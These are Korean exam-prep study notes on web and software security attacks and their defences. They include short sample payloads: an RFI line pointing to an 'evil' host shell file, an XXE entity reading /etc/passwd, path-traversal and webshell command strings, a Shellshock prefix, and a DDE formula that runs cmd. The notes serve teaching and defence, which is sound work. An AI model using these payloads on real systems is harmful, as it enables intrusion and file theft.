## SW 개발보안 — 대표 인젝션 3종 (18-3, 27-7)

빈칸 문제에서 (A)(B)(C)로 자주 함께 출제:

| 명칭 | 설명 |
|---|---|
| **(A) SQL 인젝션** | DB와 연결된 애플리케이션의 입력값을 조작해 의도하지 않은 쿼리 결과를 반환 (→ `sql-injection` 노트) |
| **(B) XSS(크로스사이트 스크립트)** | 게시판·메일 등에 삽입된 악성 스크립트가 열람자 브라우저에서 실행되어 쿠키·세션 탈취 (→ `xss-csrf` 노트) |
| **(C) 운영체제 명령어 삽입** | `system()`·`exec()` 등에 사용자 입력이 그대로 전달되어 서버에서 OS 명령 실행 (`;`, `|`, `` ` `` 로 명령 연결) |

- 공통 대응: 입력값 검증(화이트리스트), 파라미터 바인딩, 위험 함수 대신 안전 API, 최소 권한.

## 시큐어코딩 7대 취약점 유형 (2-11)

행안부 "SW 개발보안 가이드" 기준:
① **입력 데이터 검증 및 표현** (SQLi, XSS, 명령 삽입 등) ② **보안 기능** (인증·인가·암호화 부적절)
③ **시간 및 상태** (Race Condition, TOCTOU) ④ **에러 처리** (오류 메시지 정보 노출)
⑤ **코드 오류** (Null 참조, 자원 해제 실패) ⑥ **캡슐화** (디버그 코드, 민감정보 노출)
⑦ **API 오용** (취약한 API, DNS lookup 신뢰).

## 파일 인클루드 (RFI / LFI) — 5-7, 22-5

- **RFI**: `include($_GET['page'])` 에 `http://evil/shell.txt` 를 넣어 원격 코드 실행.
- **LFI**: 서버 내 파일(`../../etc/passwd`, 로그 파일) 포함 → 로그 포이즈닝으로 RCE.
- PHP 대응: 소스에서 `include`/`require` 에 사용자 입력이 들어가는지 점검 → `php.ini` 의
  **`allow_url_include = Off`**, `allow_url_fopen = Off`, 화이트리스트 기반 파일명만 허용.

## 웹셸 (WebShell) — 7-7

공격자가 업로드한 서버측 스크립트(`.php`, `.jsp`, `.asp`)로 원격 명령 실행·파일 조작·백도어 설치.
- 유입: 파일 업로드 취약점, 확장자 우회(`shell.php.jpg`, `%00`), RFI/LFI, **CGI 원격 명령 실행**(예: Shellshock `() { :;}; ...` 로 `b.php` 생성 — 29-8), SQLi `INTO OUTFILE`.
- 로그 징후: 업로드(POST) 200 직후 그 파일에 `?cmd=` 파라미터로 `id`, `cat /etc/passwd`, `wget` 요청이 이어짐.
- 대응: 업로드 디렉터리 실행권한 제거, 확장자·MIME·매직바이트 검증, 저장명 난수화, WAF, CGI 비활성.

## XXE (XML External Entity) — 16-14

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
- 외부 엔티티 참조 허용 시 로컬 파일 읽기·SSRF·DoS(Billion Laughs).
- 대응: XML 파서에서 **DTD·외부 엔티티 비활성화**(`FEATURE_SECURE_PROCESSING`), 최신 파서.

## SSRF (Server Side Request Forgery) — 25-10, 28-2

서버가 외부 입력으로 HTTP 요청을 생성하는 기능을 악용 → 내부망·클라우드 메타데이터(`169.254.169.254`) 접근.
- 대응: **화이트리스트**(허용 도메인/IP만), 블랙리스트(사설 대역·localhost 차단), 리다이렉트 차단, 응답 미반환, 메타데이터 서비스 IMDSv2.

## CRLF 인젝션 / HTTP 응답 분할 — 12-3, 22-4

입력값에 **CR(`\r`, `%0D`) + LF(`\n`, `%0A`)** 를 주입 → 응답 헤더를 조기 종료시키고 두 번째 응답을 위조 →
캐시 포이즈닝, XSS, 세션 고정. 대응: 헤더에 들어가는 값에서 CR/LF 제거·인코딩.

## HTTP Request Smuggling — 26-4

프런트엔드와 백엔드가 `Content-Length` 와 `Transfer-Encoding: chunked` 를 **다르게 해석**하는 점을 악용해
요청 경계를 흐림 → 인증 우회, 다른 사용자 요청에 악성 프리픽스 주입, 웹 캐시 포이즈닝.
- 유형: CL.TE / TE.CL / TE.TE. 대응: 프런트·백엔드 파서 통일, HTTP/2 종단, 모호한 요청 거부.

## 크리덴셜 스터핑 (17-4, 30-4)

유출된 ID/PW 목록을 다른 사이트에 **자동 대입**. (무차별 대입·패스워드 스프레이·사전 공격과 구분: 스터핑은 *유효한 조합*을 재사용)
- 대응: MFA, 로그인 실패 제한·CAPTCHA, 유출 자격증명 대조(HIBP), 이상 로그인 탐지, 비밀번호 재사용 금지.

## 문서·광고 기반 공격

- **DDE (Dynamic Data Exchange)** — 14-4, 18-4: MS Office 앱 간 데이터 교환 프로토콜. 문서에 `=cmd|'/c calc'!A0` 삽입 → 열람 시 명령 실행. 대응: DDE 비활성화, 보호된 보기, 매크로·필드 업데이트 차단.
- **Malvertising** — 12-1: Malware + Advertising. 정상 광고망을 통해 악성 광고 배포 → 클릭 또는 **단순 로드만으로도**(drive-by) 감염. 대응: 광고 SDK 검증, 광고 차단, 브라우저·플러그인 패치.
